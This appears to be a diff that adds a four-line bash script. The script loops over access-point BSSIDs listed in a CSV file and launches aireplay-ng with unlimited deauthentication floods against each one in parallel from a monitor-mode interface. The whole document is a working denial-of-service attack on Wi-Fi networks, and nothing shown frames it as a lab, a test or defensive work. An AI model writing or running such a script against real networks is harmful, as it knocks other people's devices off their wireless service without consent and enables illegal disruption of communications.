@@ -1,0 +1,4 @@
+while IFS=, read -r bssid; do
+  aireplay-ng --deauth 0 -a "$bssid" wlan0mon &
+done < deauth_targets.csv
+wait
